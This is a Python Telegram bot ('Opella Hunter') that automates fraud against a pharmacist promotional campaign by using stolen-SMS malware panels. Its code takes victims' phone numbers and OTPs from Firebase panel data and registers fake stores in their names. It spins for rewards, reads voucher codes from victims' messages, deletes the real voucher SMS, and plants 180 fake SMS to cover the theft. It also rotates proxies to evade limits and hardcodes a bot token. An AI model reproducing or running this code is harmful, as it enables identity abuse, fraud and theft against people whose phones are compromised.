#!/usr/bin/env python3
# Opella Hunter — v12.0 (Multi Force-Join + Silent Storage + Admin Panel)
# Credits: JD

import asyncio, base64, hashlib, hmac, io, json, os, random, re, string, sys, threading, time, itertools, contextvars, shutil, zipfile
from pathlib import Path
from typing import Dict, Any, List, Optional, Set
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.adapters import HTTPAdapter
from requests_toolbelt.multipart.encoder import MultipartEncoder

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode
from telegram.error import BadRequest

# ════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════
CREDIT   = "JD"
BOT_NAME = "Opella Hunter"
BOT_TOKEN = os.getenv("BOT_TOKEN", "8871069553:AAFsB1TsjrlG1IgNS0yX895F0kQHuHjEfpg")

# ⭐ FORCE JOIN CHANNELS (all required)
FORCE_CHANNELS = [
    {"username": "@camplootersonly", "url": "https://t.me/camplootersonly"},
    {"username": "@unknown012021",   "url": "https://t.me/unknown012021"},
    {"username": "@mh_lootifu",      "url": "https://t.me/mh_lootifu"},
    {"username": "@jdlooter",        "url": "https://t.me/jdlooter"},
]

# Backwards-compat references
CHANNEL_USERNAME = "@camplootersonly"
CHANNEL_URL = "https://t.me/camplootersonly"

# ⭐ ADMIN
OWNER_ID = int(os.getenv("OWNER_ID", "8880545620"))
DATA_DIR = Path(os.getenv("DATA_DIR", str(Path(__file__).parent.resolve())))
ADMINS_FILE = DATA_DIR / "admins.json"

def load_admins() -> Set[int]:
    if ADMINS_FILE.exists():
        try:
            with open(ADMINS_FILE) as f:
                data = json.load(f)
                return set(data.get("admins", [])) | {OWNER_ID}
        except: pass
    return {OWNER_ID}

def save_admins(admins: Set[int]):
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    with open(ADMINS_FILE, "w") as f:
        json.dump({"admins": list(admins)}, f, indent=2)

ADMINS: Set[int] = load_admins()

def is_admin(user_id: int) -> bool:
    return user_id in ADMINS or user_id == OWNER_ID

# ⭐ PER-USER STORAGE
USERS_DIR = DATA_DIR / "users"
USERS_DIR.mkdir(parents=True, exist_ok=True)
LOGS_DIR = DATA_DIR / "logs"
LOGS_DIR.mkdir(parents=True, exist_ok=True)

BASE_URL = "https://www.worldpharmacistdaybyopella.com"
API_BASE = f"{BASE_URL}/api"
UTM_SOURCE = "qrcode"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")

MAX_WORKERS    = 12
BATCH_SIZE     = 15
OTP_MAX_WAIT   = 25
OTP_POLL_DELAY = 1.0
STAGGER_START  = (0.0, 0.8)
NET_RETRIES    = 5
NET_BACKOFF    = 0.8
LANDING_SLEEP  = (0.15, 0.35)
QUIZ_SLEEP     = (0.1, 0.25)
PANEL_GAP      = 0.5
BURY_COUNT     = 180
BURY_BATCH     = 60
VOUCHER_WATCH_SEC = 90
ANSWERS = [1, 2, 3, 4, 2]

OPELLA_OTP_PATTERNS = [
    re.compile(r'Your OTP to register is\s+(\d{4,6})', re.IGNORECASE),
    re.compile(r'OTP to register[^\d]*(\d{4,6})', re.IGNORECASE),
    re.compile(r'\b(\d{6})\b'),
]
OPELLA_SENDER_HINTS = ["bigcity","bgcity","jm-","opella","pharmacist"]
OTHER_OTP_HINTS = ["jiomart","rrlacc","voyz","unomer","bigbasket","flipkart",
                   "amazon","swiggy","zomato","phonepe","gpay","google"]
VOUCHER_REGEX = re.compile(r'Success!?\s*Your Reward Code is\s*([A-Z0-9]{10,20})', re.IGNORECASE)

STOP_EVENT = threading.Event()
PRINT_LOCK = threading.Lock()
USED_OTPS = set()
USED_OTPS_LOCK = threading.Lock()
NO_PROXY = {"http": None, "https": None}

# ════════════════════════════════════════════════════════════
#  PER-USER PATHS (internal only)
# ════════════════════════════════════════════════════════════
def user_dir(user_id: int) -> Path:
    d = USERS_DIR / str(user_id)
    d.mkdir(parents=True, exist_ok=True)
    return d

def user_paths(user_id: int) -> Dict[str, Path]:
    d = user_dir(user_id)
    return {
        "dir": d,
        "proxies": d / "proxies.txt",
        "img": d / "pack.jpg",
        "panels": d / "panels.json",
        "results": d / "results.json",
        "wins": d / "winners.txt",
        "vouchers": d / "vouchers.txt",
        "fake_sms": d / "fake_sms.log",
    }

# ════════════════════════════════════════════════════════════
#  ICONS
# ════════════════════════════════════════════════════════════
C = {
    "win":"🟢","lose":"🎲","already":"🟡","timeout":"🟠","pending":"⚪",
    "verified":"✅","otp_sent":"📤","otp_recv":"💎","waiting":"⏳",
    "spinning":"🔄","failed":"❌","hit":"🏆","panel":"⚡","error":"⚠️",
    "done":"✔️","arrow":"▸","line":"─","bar_full":"▰","bar_empty":"▱",
    "lock":"🔒","check":"☑️","cross":"❌","join":"📢",
}
def esc(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

_current_chat = contextvars.ContextVar("current_chat", default=None)

# ════════════════════════════════════════════════════════════
#  FORCE JOIN (multi-channel)
# ════════════════════════════════════════════════════════════
async def is_user_joined(user_id: int) -> bool:
    for ch in FORCE_CHANNELS:
        try:
            member = await BOT_APP.bot.get_chat_member(chat_id=ch["username"], user_id=user_id)
            if member.status not in ("member", "administrator", "creator"):
                return False
        except Exception as e:
            print(f"join check err ({ch['username']}): {e}")
            return False
    return True

async def missing_channels(user_id: int) -> List[Dict[str, str]]:
    missing = []
    for ch in FORCE_CHANNELS:
        try:
            member = await BOT_APP.bot.get_chat_member(chat_id=ch["username"], user_id=user_id)
            if member.status not in ("member", "administrator", "creator"):
                missing.append(ch)
        except Exception as e:
            print(f"join check err ({ch['username']}): {e}")
            missing.append(ch)
    return missing

def join_kb(missing: Optional[List[Dict[str, str]]] = None):
    if missing is None:
        missing = FORCE_CHANNELS
    rows = []
    for ch in missing:
        rows.append([InlineKeyboardButton(
            f"{C['join']} Join {ch['username']}", url=ch["url"])])
    rows.append([InlineKeyboardButton(
        f"{C['check']} I Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)

async def require_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if user is None: return False

    missing = await missing_channels(user.id)
    if not missing:
        return True

    ch_list = "\n".join(f"  {i}. <a href='{c['url']}'>{c['username']}</a>"
                        for i, c in enumerate(missing, 1))
    text = (
        f"{C['lock']} <b>Access Restricted</b>\n"
        f"{'─'*40}\n"
        f"You must join <b>{len(missing)}</b> channel(s) to use this bot:\n"
        f"{ch_list}\n\n"
        f"{'─'*40}\n"
        f"1. Tap each button below\n"
        f"2. Join all channels\n"
        f"3. Come back and tap Verify\n"
        f"{'─'*40}\n"
        f"<i>Support: @CAMPLOOTERSCC</i>"
    )
    try:
        await update.effective_message.reply_text(
            text, parse_mode="HTML",
            reply_markup=join_kb(missing),
            disable_web_page_preview=True)
    except Exception as e:
        print(f"join prompt err: {e}")
    return False

# ════════════════════════════════════════════════════════════
#  PROXY
# ════════════════════════════════════════════════════════════
def _parse_proxy_line(line):
    parts = line.strip().split(":")
    if len(parts) < 4: return None
    host, port, user, pwd = parts[0], parts[1], parts[2], ":".join(parts[3:])
    url = f"http://{user}:{pwd}@{host}:{port}"
    return {"http": url, "https": url, "url": url}

def load_proxies(user_id: int):
    pool = []
    pfile = user_paths(user_id)["proxies"]
    if pfile.exists():
        try:
            with open(pfile) as f:
                for line in f:
                    if line.strip() and not line.startswith("#"):
                        p = _parse_proxy_line(line)
                        if p: pool.append(p)
        except: pass
    return pool

# ════════════════════════════════════════════════════════════
#  HELPERS
# ════════════════════════════════════════════════════════════
def b64_encode(v):
    if isinstance(v, str): v = v.encode()
    return base64.b64encode(v).decode()

def decode_resp(resp):
    try:
        if not resp.text or not resp.text.strip():
            return {"statusCode": None, "message": "empty body"}
        obj = resp.json()
        if isinstance(obj, dict) and obj.get("resp"):
            return json.loads(base64.b64decode(obj["resp"]).decode())
        return obj
    except:
        return {"statusCode": None, "message": f"bad body: {resp.text[:150]}"}

def random_string(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def build_hmac_sig(data_key, ts_b64, payload_b64):
    key = data_key[4:18].encode()
    msg = f"{ts_b64}.{payload_b64}".encode()
    return b64_encode(hmac.new(key, msg, hashlib.sha256).hexdigest())

def build_wrapped_data(user_key, data_key, payload):
    ts = int(time.time() * 1000)
    payload = dict(payload)
    payload["userKey"] = int(user_key) if str(user_key).isdigit() else user_key
    payload["t"] = ts
    raw = json.dumps(payload, separators=(",", ":"), ensure_ascii=False)
    p_b64 = b64_encode(raw); t_b64 = b64_encode(str(ts))
    sig = build_hmac_sig(data_key, t_b64, p_b64)
    w = random.randint(1, 6); v = random.randint(2, 8)
    rnd = random_string(v)
    return t_b64, p_b64, f"{v}{w}{sig[:w]}{rnd}{sig[w:]}", ts

def normalize_phone(p):
    if not p: return None
    d = re.sub(r"\D", "", str(p))
    if len(d) > 10:
        if d.startswith("91") and len(d) == 12: d = d[2:]
        elif d.startswith("0") and len(d) == 11: d = d[1:]
        else: d = d[-10:]
    if len(d) == 10 and d[0] in "6789": return d
    return None

def _tiny_jpeg():
    return bytes.fromhex("ffd8ffe000104a46494600010100000100010000ffdb004300080606070605080707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720222c231c1c2837292c303134341f27393d38323c2e333432ffc0000b080001000101011100ffc400140001000000000000000000000000000000000affda0008010100003f00d2cf20ffd9")

def load_store_image(user_id: int):
    img = user_paths(user_id)["img"]
    if img.exists():
        try:
            with open(img, "rb") as f: data = f.read()
            if data: return data, "pack.jpg", "image/jpeg"
        except: pass
    return _tiny_jpeg(), "pack.jpg", "image/jpeg"

def parse_panel_link(link):
    if not link: return None
    link = link.strip()
    if link.startswith("http") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        return link if link.endswith("/") else link + "/"
    qs = parse_qs(urlparse(link).query)
    if "s" not in qs: return None
    s = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
    try:
        dec = base64.b64decode(s).decode("utf-8").split("|")[0].strip()
        return dec if dec.endswith("/") else dec + "/"
    except: return None

def load_json(p, d=None):
    if d is None: d = {}
    if not p.exists(): return d
    try:
        with open(p) as f: return json.load(f)
    except: return d

def save_json(p, d):
    with open(p, "w") as f: json.dump(d, f, indent=2)

# ════════════════════════════════════════════════════════════
#  FIREBASE
# ════════════════════════════════════════════════════════════
def fb_get(url, timeout=6):
    try:
        r = requests.get(url, timeout=timeout, verify=False, proxies=NO_PROXY)
        return r.json() if r.status_code == 200 else None
    except: return None

def fb_patch(url, data, timeout=15):
    try:
        r = requests.patch(url, json=data, timeout=timeout, verify=False, proxies=NO_PROXY)
        return r.status_code in (200, 201)
    except: return False

def fb_delete(url, timeout=6):
    try:
        r = requests.delete(url, timeout=timeout, verify=False, proxies=NO_PROXY)
        return r.status_code in (200, 204)
    except: return False

def bury_fake_sms(user_id, fb_url, device_id, count=BURY_COUNT, tag=""):
    push_log(f"💣 [{tag}] Burying {count} fake SMS…", "warn")
    url = f"{fb_url}messages/{device_id}.json"
    base_ts = int(time.time() * 1000)
    pushed = 0
    for bi in range(0, count, BURY_BATCH):
        if STOP_EVENT.is_set(): break
        payload = {}
        for i in range(BURY_BATCH):
            idx = bi + i
            if idx >= count: break
            key = str(base_ts + idx)
            payload[key] = {
                "address": f"+91{random.randint(6000000000, 9999999999)}",
                "body": f"<#> {random.randint(100000,999999)} is your verification code. Valid 5 min.",
                "date": str(base_ts + idx), "type": "1",
            }
        if fb_patch(url, payload): pushed += len(payload)
        else: break
    try:
        with open(user_paths(user_id)["fake_sms"], "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {tag} {device_id} pushed={pushed}\n")
    except: pass
    push_log(f"💣 [{tag}] Bury done: {pushed}/{count}", "ok")
    return pushed

def watch_voucher(user_id, fb_url, device_id, phone, tag="", timeout=VOUCHER_WATCH_SEC):
    push_log(f"👀 [{tag}] Watching voucher for {phone}…", "info")
    start = time.time()
    seen = set()
    d = fb_get(f"{fb_url}messages/{device_id}.json?limitToLast=30")
    if isinstance(d, dict): seen = set(d.keys())

    while time.time() - start < timeout:
        if STOP_EVENT.is_set(): return None
        d = fb_get(f"{fb_url}messages/{device_id}.json")
        if isinstance(d, dict):
            for mid in sorted(d.keys(), reverse=True):
                if mid in seen: continue
                m = d[mid]
                if not isinstance(m, dict): seen.add(mid); continue
                txt = str(m.get("body") or m.get("message") or m.get("text") or "")
                if "Reward Code" not in txt and "reward code" not in txt.lower():
                    seen.add(mid); continue
                mx = VOUCHER_REGEX.search(txt)
                if mx:
                    voucher = mx.group(1)
                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
                    # silent save
                    try:
                        with open(user_paths(user_id)["vouchers"], "a", encoding="utf-8") as f:
                            f.write(f"{voucher} | {ts} | phone={phone} | device={device_id}\n")
                    except: pass
                    push_log(f"🎁🎁🎁 [{tag}] VOUCHER FOUND: {voucher} | {phone}", "voucher")
                    try: fb_delete(f"{fb_url}messages/{device_id}/{mid}.json")
                    except: pass
                    bury_fake_sms(user_id, fb_url, device_id, BURY_COUNT, tag=f"{tag} voucher")
                    return voucher
                seen.add(mid)
        time.sleep(2)
    push_log(f"⚠️ [{tag}] No voucher in {timeout}s", "warn")
    return None

def fetch_devices_for_panel(firebase_url):
    try:
        r = requests.get(firebase_url + "clients.json", timeout=15, verify=False,
                         proxies=NO_PROXY, headers={"Connection": "keep-alive"})
        clients = r.json()
        if not isinstance(clients, dict): clients = {}
    except Exception as e:
        push_log(f"  ❌ panel err: {e}", "err"); return []

    online = []
    for cid, cd in clients.items():
        if not isinstance(cd, dict): continue
        status = cd.get("status") or cd.get("online") or cd.get("isOnline") or cd.get("state") or ""
        if status is True: online.append(cid)
        elif isinstance(status, str) and status.strip().lower() in ("online","active","1","true","yes"): online.append(cid)
        elif isinstance(status, (int,float)) and status == 1: online.append(cid)

    if not online:
        push_log(f"  ⚠️ no online clients", "warn"); return []

    phone_pats = [
        re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
        re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"),
    ]

    _tls = threading.local()
    def sess():
        s = getattr(_tls, "s", None)
        if s is None:
            s = requests.Session(); s.verify = False; s.proxies = NO_PROXY
            s.mount("https://", HTTPAdapter(pool_connections=8, pool_maxsize=8))
            s.mount("http://",  HTTPAdapter(pool_connections=8, pool_maxsize=8))
            s.headers.update({"User-Agent": UA, "Connection": "keep-alive"})
            _tls.s = s
        return s

    out = []; seen = set()
    def one(cid):
        cd = clients.get(cid, {})
        direct = cd.get("phone") or cd.get("mobile") or cd.get("number")
        if direct:
            n = normalize_phone(direct)
            if n: return {"client_id": cid, "phone": n}
        try:
            mr = sess().get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=50', timeout=4)
            msgs = mr.json()
            if not isinstance(msgs, dict): return None
            text = " ".join(str(m.get("body") or m.get("message") or m.get("text") or m.get("sms") or "")
                            for m in msgs.values() if isinstance(m, dict))
            for pat in phone_pats:
                mm = pat.search(text)
                if mm:
                    n = normalize_phone(mm.group(1) if mm.groups() else mm.group(0))
                    if n: return {"client_id": cid, "phone": n}
        except: pass
        return None

    with ThreadPoolExecutor(max_workers=300) as ex:
        for f in as_completed([ex.submit(one, cid) for cid in online]):
            res = f.result()
            if res and res["phone"] not in seen:
                seen.add(res["phone"])
                res["firebase_url"] = firebase_url
                out.append(res)
    return out

# ════════════════════════════════════════════════════════════
#  OTP FETCH
# ════════════════════════════════════════════════════════════
def try_claim_otp(otp):
    with USED_OTPS_LOCK:
        if otp in USED_OTPS: return False
        USED_OTPS.add(otp); return True

def fetch_opella_otp(fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=None):
    start = time.time()
    trigger_ms = int((since_ts - 20) * 1000) if since_ts else int((time.time() - 90) * 1000)
    while time.time() - start < timeout:
        if STOP_EVENT.is_set(): return None
        try:
            r = requests.get(f'{fb_url}messages/{device_id}.json?orderBy="$key"&limitToLast=25',
                             timeout=5, verify=False, proxies=NO_PROXY)
            if r.status_code != 200: time.sleep(OTP_POLL_DELAY); continue
            msgs = r.json()
            if not isinstance(msgs, dict): time.sleep(OTP_POLL_DELAY); continue
            ordered = sorted(msgs.items(), key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0, reverse=True)
            for mid, m in ordered:
                if not isinstance(m, dict): continue
                if str(mid).isdigit() and int(mid) < trigger_ms: continue
                sender = str(m.get("sender") or "").lower()
                body = str(m.get("body") or m.get("message") or m.get("text") or m.get("sms") or "")
                bl = body.lower()
                if any(h in sender for h in OTHER_OTP_HINTS): continue
                sender_ok = any(h in sender for h in OPELLA_SENDER_HINTS)
                body_ok = ("bigcity" in bl or "bgcity" in bl or "otp to register" in bl or "opella" in bl)
                if not (sender_ok or body_ok):
                    if not any(p.search(body) for p in OPELLA_OTP_PATTERNS[:2]): continue
                for pat in OPELLA_OTP_PATTERNS:
                    mm = pat.search(body)
                    if mm:
                        otp = mm.group(1)
                        if 4 <= len(otp) <= 6 and otp.isdigit():
                            if not try_claim_otp(otp): continue
                            return otp
            time.sleep(OTP_POLL_DELAY)
        except: time.sleep(OTP_POLL_DELAY)
    return None

# ════════════════════════════════════════════════════════════
#  OPELLA CLIENT
# ════════════════════════════════════════════════════════════
def _looks_like_jwt(s):
    if not isinstance(s, str): return False
    p = s.split(".")
    return len(p) == 3 and len(s) > 40 and all(p)

def _find_token_deep(obj):
    if isinstance(obj, dict):
        for k in ("token","accessToken","jwt","authToken","bearer"):
            if _looks_like_jwt(obj.get(k)): return obj[k]
        for v in obj.values():
            t = _find_token_deep(v)
            if t: return t
    elif isinstance(obj, list):
        for v in obj:
            t = _find_token_deep(v)
            if t: return t
    return None

NET_EXC = (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout,
           requests.exceptions.ConnectTimeout, requests.exceptions.ChunkedEncodingError,
           requests.exceptions.SSLError, requests.exceptions.ProxyError, requests.exceptions.Timeout)

def _net_call(fn, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=None):
    last = None
    for attempt in range(1, retries + 1):
        if STOP_EVENT.is_set(): return {"statusCode": None, "message": "stopped"}
        try: return fn()
        except NET_EXC as e:
            last = {"statusCode": None, "message": f"{type(e).__name__}", "_net_error": True}
            if on_retry and attempt < retries:
                try: on_retry()
                except: pass
            time.sleep(backoff * attempt)
        except Exception as e:
            return {"statusCode": None, "message": f"{type(e).__name__}: {e}"}
    return last or {"statusCode": None, "message": "net retries exhausted"}

class OpellaClient:
    def __init__(self, proxy=None, proxy_pool=None):
        self.s = requests.Session()
        self.s.mount("http://", HTTPAdapter(pool_connections=4, pool_maxsize=4))
        self.s.mount("https://", HTTPAdapter(pool_connections=4, pool_maxsize=4))
        self.s.headers.update({
            "User-Agent": UA, "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "origin": BASE_URL, "referer": f"{BASE_URL}/",
            "sec-ch-ua": '"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        })
        self.proxy_pool = proxy_pool or []
        self.proxy_url = None
        if proxy:
            self.s.proxies.update({"http": proxy, "https": proxy})
            self.proxy_url = proxy
        self.user_key = None
        self.data_key = None
        self.token = None

    def _rotate_proxy(self):
        if not self.proxy_pool: return
        p = random.choice(self.proxy_pool)["url"]
        self.s.proxies.clear()
        self.s.proxies.update({"http": p, "https": p})
        self.proxy_url = p

    def create_user(self):
        def _do():
            resp = self.s.post(f"{API_BASE}/users",
                               headers={"accept": "application/json", "content-type": "application/json"},
                               json={"utm_source": UTM_SOURCE}, timeout=(8, 18))
            d = decode_resp(resp)
            if d.get("statusCode") != 200: raise RuntimeError(f"createUser: {d}")
            self.user_key = str(d.get("userKey") or d.get("data", {}).get("userKey"))
            self.data_key = str(d.get("dataKey") or d.get("data", {}).get("dataKey"))
            if not self.user_key or not self.data_key: raise RuntimeError(f"missing keys: {d}")
            return d
        return _net_call(_do, retries=NET_RETRIES, on_retry=self._rotate_proxy)

    def _signed_post(self, endpoint, payload, with_token=False, referer=None):
        def _do():
            t_b64, p_b64, sig_p, _ = build_wrapped_data(self.user_key, self.data_key, payload)
            body = {"userKey": self.user_key, "data": f"{t_b64}.{p_b64}.{sig_p}"}
            h = {"accept": "*/*", "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "origin": BASE_URL, "referer": referer or f"{BASE_URL}/", "connection": "close"}
            if with_token and self.token: h["authorization"] = f"Bearer {self.token}"
            url = f"{API_BASE}/{endpoint}?t={int(time.time()*1000)}"
            resp = self.s.post(url, data=body, headers=h, timeout=(8, 18))
            return decode_resp(resp)
        return _net_call(_do, retries=NET_RETRIES, on_retry=self._rotate_proxy)

    def landing_track(self, track_type):
        return self._signed_post(f"users/landing-track/{self.user_key}", {"type": track_type})

    def get_state_cities(self):
        def _do():
            r = self.s.get(f"{API_BASE}/state-cities",
                           headers={"accept": "*/*", "referer": f"{BASE_URL}/register"}, timeout=(8, 15))
            if r.status_code == 200: return decode_resp(r)
            return {"statusCode": r.status_code, "message": "state-cities bad"}
        return _net_call(_do, retries=3, on_retry=self._rotate_proxy)

    def register(self, mobile, store_name, retailer_name, state, city, img_bytes, img_name="pack.jpg", img_mime="image/jpeg"):
        payload = {"mobile": mobile, "storeName": store_name, "retailerName": retailer_name,
                   "state": state, "city": city,
                   "userKey": int(self.user_key) if str(self.user_key).isdigit() else self.user_key}
        t_b64, p_b64, sig_p, _ = build_wrapped_data(self.user_key, self.data_key, payload)
        data_field = f"{t_b64}.{p_b64}.{sig_p}"
        url = f"{API_BASE}/register/{self.user_key}?t={int(time.time()*1000)}"
        h_base = {"accept": "*/*", "origin": BASE_URL, "referer": f"{BASE_URL}/register", "connection": "close"}
        def _do():
            mp = MultipartEncoder(fields={"storeImage": (img_name, io.BytesIO(img_bytes), img_mime), "data": data_field})
            h = dict(h_base); h["content-type"] = mp.content_type
            resp = self.s.post(url, data=mp, headers=h, timeout=(8, 22))
            return decode_resp(resp)
        return _net_call(_do, retries=NET_RETRIES, on_retry=self._rotate_proxy)

    def verify_otp(self, otp):
        d = self._signed_post(f"users/verify-otp/{self.user_key}", {"otp": str(otp)},
                              referer=f"{BASE_URL}/otp-verification")
        tok = _find_token_deep(d) if isinstance(d, dict) else None
        if not tok:
            for c in self.s.cookies:
                if _looks_like_jwt(c.value): tok = c.value; break
        if tok: self.token = tok
        return d

    def get_question(self):
        return self._signed_post(f"users/get-question/{self.user_key}", {}, with_token=True, referer=f"{BASE_URL}/quiz")

    def submit_answer(self, qid, opt):
        return self._signed_post(f"users/submit-answer/{self.user_key}",
                                 {"questionId": qid, "selectedOption": str(opt)},
                                 with_token=True, referer=f"{BASE_URL}/quiz")

    def spin(self):
        return self._signed_post(f"users/spin/{self.user_key}", {}, with_token=True, referer=f"{BASE_URL}/wheel-spin")

def extract_state_city_pairs(sc):
    pairs = []
    if not sc: return pairs
    data = sc.get("data") if isinstance(sc, dict) else sc
    if not isinstance(data, dict): return pairs
    for item in (data.get("states") or []):
        if not isinstance(item, dict): continue
        st = item.get("state")
        cities = item.get("cities") or []
        if isinstance(cities, str): cities = [cities]
        for c in cities:
            if isinstance(c, str) and st: pairs.append((st, c))
    return pairs

def rand_store():
    first = ["Sunata","Ravi","Ashok","Vikram","Manoj","Sanjay","Ajay","Deepak","Rakesh","Naresh","Kamal","Pooja","Neha","Sunita","Anita"]
    last = ["Dev","Medical","Pharma","Chemist","Store","Drug House","Medicos","Health Mart","Care","Pharmacy"]
    return f"{random.choice(first)} {random.choice(last)}"

def save_win(user_id, phone, user_key, resp):
    # silent save
    try:
        with open(user_paths(user_id)["wins"], "a", encoding="utf-8") as f:
            data = resp.get("data", {}) if isinstance(resp, dict) else {}
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] WIN {phone} user={user_key} reward={data.get('rewardType')} amt={data.get('rewardAmount')}\n")
    except: pass

def save_result(user_id, rec):
    # silent save
    try:
        with PRINT_LOCK:
            rf = user_paths(user_id)["results"]
            data = load_json(rf, {"results": []})
            data.setdefault("results", []).append(rec)
            save_json(rf, data)
    except: pass

def _msg_of(d):
    if not isinstance(d, dict): return ""
    return str(d.get("message") or "").lower()

def is_already_spun(d):
    m = _msg_of(d); return "already spun" in m or "already_spun" in m or "already spinned" in m

def is_already_completed(d):
    m = _msg_of(d); return "already completed" in m or "already registered" in m or "already participated" in m

# ════════════════════════════════════════════════════════════
#  PER-PHONE FLOW
# ════════════════════════════════════════════════════════════
def flow_for_phone(user_id, phone, device_id, fb_url, proxy, tag, st_pairs, proxy_pool=None):
    res = {"phone": phone, "device_id": device_id, "firebase_url": fb_url, "tag": tag,
           "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
    time.sleep(random.uniform(*STAGGER_START))
    c = OpellaClient(proxy=proxy, proxy_pool=proxy_pool)
    try:
        cu = c.create_user()
        if not c.user_key or not c.data_key:
            res["status"] = "create_failed"; res["error"] = cu.get("message")
            push_log(f"[{tag}] ❌ {phone} create: {cu.get('message')}", "err"); return res
        res["user_key"] = c.user_key
        c.landing_track("watched_video"); time.sleep(random.uniform(*LANDING_SLEEP))
        c.landing_track("continue_to_registration"); time.sleep(random.uniform(*LANDING_SLEEP))
        state, city = random.choice(st_pairs) if st_pairs else ("Karnataka", "Bangalore")
        store = rand_store()
        img_b, img_n, img_m = load_store_image(user_id)
        sent_at = time.time()
        r = c.register(phone, store, store, state, city, img_b, img_n, img_m)
        if is_already_completed(r):
            res["status"] = "already_registered"
            push_log(f"[{tag}] ⏭️ {phone} already registered", "warn"); return res
        if r.get("statusCode") not in (200, 201):
            res["status"] = "register_failed"; res["register_resp"] = r
            push_log(f"[{tag}] ❌ {phone} register: {r.get('message')}", "err"); return res
        res["register_ok"] = True
        push_log(f"[{tag}] ✅ {phone} registered", "ok")
        otp = fetch_opella_otp(fb_url, device_id, timeout=OTP_MAX_WAIT, since_ts=sent_at)
        if not otp:
            res["status"] = "otp_timeout"
            push_log(f"[{tag}] ⏰ {phone} OTP timeout", "warn"); return res
        res["otp"] = otp
        push_log(f"[{tag}] 📩 {phone} OTP={otp}", "ok")
        v = c.verify_otp(otp)
        if v.get("statusCode") != 200:
            res["status"] = "verify_failed"; res["verify_resp"] = v
            push_log(f"[{tag}] ❌ {phone} verify: {v.get('message')}", "err"); return res
        res["verify_ok"] = True
        push_log(f"[{tag}] 🔓 {phone} verified", "ok")
        for qid, ans in enumerate(ANSWERS, start=1):
            c.get_question(); c.submit_answer(qid, ans)
            push_log(f"[{tag}] 📝 {phone} Q{qid} → option {ans}", "info")
            time.sleep(random.uniform(*QUIZ_SLEEP))
        s = c.spin()
        res["spin_resp"] = s
        if is_already_spun(s):
            res["status"] = "already_spun"
            push_log(f"[{tag}] ⏭️ {phone} already spun", "warn"); return res
        if isinstance(s, dict) and s.get("statusCode") == 200:
            data = s.get("data", {}) or {}
            is_winner = bool(data.get("isWinner"))
            reward_type = data.get("rewardType")
            reward_amount = data.get("rewardAmount")
            if is_winner:
                res["status"] = "WIN"; res["reward_type"] = reward_type; res["reward_amount"] = reward_amount
                save_win(user_id, phone, c.user_key, s)
                push_log(f"[{tag}] ★ {phone} WON reward={reward_type} amt={reward_amount}", "voucher")
                threading.Thread(target=watch_voucher, args=(user_id, fb_url, device_id, phone, tag), daemon=True).start()
            else:
                res["status"] = "lose"; res["reward_type"] = reward_type
                push_log(f"[{tag}] ○ {phone} lose reward={reward_type}", "info")
        else:
            res["status"] = "spin_failed"
            push_log(f"[{tag}] ❌ {phone} spin failed", "err")
        return res
    except Exception as e:
        res["status"] = f"exception:{type(e).__name__}"; res["error"] = str(e)[:200]
        push_log(f"[{tag}] ❗ {phone} {type(e).__name__}: {e}", "err")
        return res
    finally:
        try: c.s.close()
        except: pass

# ════════════════════════════════════════════════════════════
#  TELEGRAM STATE
# ════════════════════════════════════════════════════════════
CHAT_STATE: Dict[int, Dict[str, Any]] = {}
STATE_LOCK = threading.RLock()

def get_state(chat_id):
    with STATE_LOCK:
        if chat_id not in CHAT_STATE:
            CHAT_STATE[chat_id] = {
                "running": False, "panels": [], "current_panel": 0,
                "devices_total": 0, "processed": 0,
                "wins": 0, "losses": 0, "already_spun": 0,
                "otp_sent": 0, "otp_verified": 0, "errors": 0,
                "panel_stats": {}, "hits": [],
                "panel_numbers": {}, "numbers": {}, "num_order": [],
                "log_msg_id": None, "last_edit": 0,
                "stop_event": threading.Event(), "started_at": 0,
            }
        return CHAT_STATE[chat_id]

def ensure_number(st, panel_idx, phone):
    with STATE_LOCK:
        pn = st["panel_numbers"].setdefault(panel_idx, {})
        if phone not in pn:
            pn[phone] = {"phone": phone, "otp_sent": False, "otp_recv": False,
                         "verified": False, "timeout": False, "result": None,
                         "reward": None, "amount": None, "ts": time.time()}
            if len(pn) > 1000:
                oldest = sorted(pn.items(), key=lambda kv: kv[1]["ts"])[0][0]
                pn.pop(oldest, None)
        st["numbers"][phone] = pn[phone]
        if phone not in st["num_order"]:
            st["num_order"].append(phone)
            if len(st["num_order"]) > 1500: st["num_order"].pop(0)
        return pn[phone]

BOT_APP: Application = None
BOT_LOOP: asyncio.AbstractEventLoop = None
